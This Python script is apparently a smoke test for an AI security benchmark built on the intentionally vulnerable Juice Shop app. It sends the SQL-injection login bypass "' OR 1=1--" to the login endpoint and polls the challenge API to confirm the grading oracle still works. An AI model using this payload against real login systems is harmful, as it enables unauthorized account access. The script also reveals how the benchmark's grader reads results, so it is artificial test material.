#!/usr/bin/env python3
"""APT -- oracle smoke test (OS-agnostic replacement for verify_oracle.sh).

Proves that Juice Shop's server-side challenge tracker still works AFTER the
scoreboard/route removal: it fires one known exploit (the SQL-injection admin
login bypass) and confirms the corresponding challenge flips to solved:true via
the REST oracle at GET /api/Challenges/.

This is what your evaluation harness polls for grading, so it must keep working
with the board hidden. Run it after every rebuild of the container.

Uses only the Python standard library (urllib) -- no curl/jq dependency.

Usage:  python3 verify_oracle.py [TARGET_URL]
        TARGET_URL defaults to http://127.0.0.1:3000
Exit:   0 if the oracle reports the exploit as solved, 1 otherwise.
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.error
import urllib.request

CHALLENGE_KEY = "loginAdminChallenge"   # solved by the SQLi login bypass below
SQLI_EMAIL = "' OR 1=1--"               # returns the first user (admin)
MAX_POLLS = 8                            # each poll also triggers deferred verification
POLL_DELAY = 2.0


def _supports_colour() -> bool:
    if not sys.stdout.isatty():
        return False
    if os.name != "nt":
        return True
    return "WT_SESSION" in os.environ or os.environ.get("TERM_PROGRAM") == "vscode"


if _supports_colour():
    GREEN, YELLOW, RED, BOLD, RESET = (
        "\033[0;32m", "\033[0;33m", "\033[0;31m", "\033[1m", "\033[0m",
    )
else:
    GREEN = YELLOW = RED = BOLD = RESET = ""


def ok(msg: str) -> None:
    print(f"  {GREEN}[ PASS ]{RESET} {msg}")


def warn(msg: str) -> None:
    print(f"  {YELLOW}[ WARN ]{RESET} {msg}")


def fail(msg: str) -> None:
    print(f"  {RED}[ FAIL ]{RESET} {msg}")


def _get_json(url: str, timeout: float = 12.0):
    with urllib.request.urlopen(url, timeout=timeout) as resp:
        return json.load(resp)


def _reachable(target: str) -> bool:
    try:
        with urllib.request.urlopen(target, timeout=10) as resp:
            return 200 <= resp.status < 400
    except urllib.error.HTTPError as exc:
        # An HTTP error status still proves the server answered.
        return exc.code < 500
    except (urllib.error.URLError, OSError):
        return False


def challenge_solved(target: str) -> str:
    """Return 'true'/'false'/'' for CHALLENGE_KEY. Fetching the list also nudges
    Juice Shop to verify any deferred DB challenges."""
    try:
        data = _get_json(f"{target}/api/Challenges/").get("data", [])
    except (urllib.error.URLError, OSError, ValueError):
        return ""
    for row in data:
        if row.get("key") == CHALLENGE_KEY:
            return "true" if row.get("solved") else "false"
    return ""


def fire_sqli_login(target: str) -> bool:
    """POST the SQLi login bypass; return True if an auth token comes back."""
    payload = json.dumps({"email": SQLI_EMAIL, "password": "x"}).encode()
    req = urllib.request.Request(
        f"{target}/rest/user/login", data=payload,
        headers={"Content-Type": "application/json"}, method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=12) as resp:
            body = json.load(resp)
    except urllib.error.HTTPError as exc:
        try:
            body = json.load(exc)
        except (ValueError, OSError):
            return False
    except (urllib.error.URLError, OSError, ValueError):
        return False
    return bool((body.get("authentication") or {}).get("token"))


def main(argv: list[str]) -> int:
    target = (argv[1] if len(argv) > 1 else "http://127.0.0.1:3000").rstrip("/")
    print(f"{BOLD}== APT oracle smoke test =={RESET}\n  target: {target}\n")

    # --- 1. target reachable? ----------------------------------------------
    if _reachable(target):
        ok("Target is reachable.")
    else:
        fail(f"Cannot reach {target}. Is the container running?")
        return 1

    # --- 2. oracle readable + baseline state -------------------------------
    try:
        total = len(_get_json(f"{target}/api/Challenges/").get("data", []))
    except (urllib.error.URLError, OSError, ValueError):
        total = 0
    if total == 0:
        fail("GET /api/Challenges/ returned no challenge data -- the oracle is not readable.")
        return 1
    ok(f"Oracle readable: /api/Challenges/ returned {total} challenges.")

    before = challenge_solved(target)
    if before == "true":
        warn(f"'{CHALLENGE_KEY}' is already solved -- container isn't fresh.")
        warn("Oracle is readable, but this run can't demonstrate the flip. Rebuild for a clean test.")
        return 0
    ok(f"Baseline: '{CHALLENGE_KEY}' is not yet solved.")

    # --- 3. fire the exploit (SQLi admin login bypass) ---------------------
    print(f"  {YELLOW}...{RESET} firing SQLi login bypass...")
    if fire_sqli_login(target):
        ok("Exploit worked: received an authentication token without valid credentials.")
    else:
        warn("No auth token in login response -- the exploit may not have landed.")

    # --- 4. poll the oracle for the flip -----------------------------------
    print(f"  {YELLOW}...{RESET} polling oracle for solve confirmation...")
    for _ in range(MAX_POLLS):
        if challenge_solved(target) == "true":
            print(f"\n{BOLD}== Result =={RESET}  {GREEN}ORACLE CONFIRMED{RESET}")
            print(f"'{CHALLENGE_KEY}' flipped to solved:true with the scoreboard removed.")
            print("Your grader (GET /api/Challenges/) works. ✓")
            return 0
        time.sleep(POLL_DELAY)

    # --- 5. failure --------------------------------------------------------
    print(f"\n{BOLD}== Result =={RESET}  {RED}ORACLE NOT CONFIRMED{RESET}")
    fail(f"'{CHALLENGE_KEY}' did not flip to solved after {MAX_POLLS} polls.")
    print("Either the exploit did not land or challenge tracking is broken. "
          "Investigate before relying on the oracle.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
